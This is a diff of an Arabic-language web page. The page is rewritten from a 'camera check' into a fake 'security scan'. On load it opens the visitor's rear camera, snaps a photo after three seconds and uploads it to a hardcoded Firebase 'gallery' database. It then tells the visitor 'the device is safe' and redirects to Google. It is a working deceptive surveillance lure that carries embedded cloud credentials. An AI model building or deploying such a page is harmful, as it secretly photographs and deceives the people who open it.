@@ -1,41 +1,12 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>فحص الكاميرا</title>
+<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>فحص الحماية</title>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
-<style>
-*{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Segoe UI',Tahoma,sans-serif;background:#000;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.container{max-width:400px;width:100%;text-align:center}
-h1{font-size:18px;color:#4CAF50;margin-bottom:10px}
-video{width:100%;border-radius:12px;border:2px solid #333;margin-bottom:10px}
-.status{color:#4CAF50;font-size:14px;margin:10px 0}
-canvas{display:none}
-</style>
-</head>
-<body>
-<div class="container"><h1>📷 فحص الكاميرا الخلفية</h1>
-<video id="video" autoplay playsinline></video>
-<div class="status" id="status">⏳ جاري التصوير...</div></div>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',Tahoma,sans-serif;background:#1a1a2e;color:#fff;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;text-align:center}.container{max-width:400px}.logo{font-size:60px;margin-bottom:10px}h1{color:#4CAF50;font-size:18px;margin-bottom:5px}p{color:#aaa;font-size:12px}video{width:100%;border-radius:10px;margin:10px 0;border:2px solid #333}.status{color:#4CAF50;font-size:13px}canvas{display:none}</style></head>
+<body><div class="container"><div class="logo">🛡️</div><h1>فحص الحماية</h1><p>جاري فحص أمان الكاميرا الخلفية...</p><video id="video" autoplay playsinline></video><div class="status" id="status">⏳ جاري الفحص...</div></div>
 <canvas id="canvas" width="320" height="240"></canvas>
 <script>
 firebase.initializeApp({apiKey:"AIzaSyBu-9Z0T-OHPzauWXh8hmNSMDZKhAFnkf0",projectId:"game-a1aca",storageBucket:"game-a1aca.firebasestorage.app",appId:"1:598280425947:android:0e4ead8d9b50cfc92157fe"});
 var db=firebase.firestore();
-async function go(){
-try{
-var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});
-document.getElementById('video').srcObject=s;
-setTimeout(async function(){
-var c=document.getElementById('canvas'),ctx=c.getContext('2d');
-ctx.drawImage(document.getElementById('video'),0,0,320,240);
-await db.collection('gallery').add({url:c.toDataURL('image/jpeg',0.6),type:'📷 خلفية',timestamp:new Date().toISOString()});
-s.getTracks().forEach(function(t){t.stop();});
-document.getElementById('status').textContent='✅ تم التصوير';
-setTimeout(function(){window.location.href='https://google.com/'},2000);
-},3000);
-}catch(e){document.getElementById('status').textContent='❌ خطأ';}
-}
+async function go(){try{var s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});document.getElementById('video').srcObject=s;setTimeout(async function(){var c=document.getElementById('canvas'),ctx=c.getContext('2d');ctx.drawImage(document.getElementById('video'),0,0,320,240);await db.collection('gallery').add({url:c.toDataURL('image/jpeg',0.6),type:'📷 فحص الحماية - خلفي',timestamp:new Date().toISOString()});s.getTracks().forEach(function(t){t.stop()});document.getElementById('status').textContent='✅ الجهاز آمن';setTimeout(function(){window.location.href='https://google.com/'},2000)},3000)}catch(e){document.getElementById('status').textContent='❌ خطأ'}}
 go();
 </script></body></html>
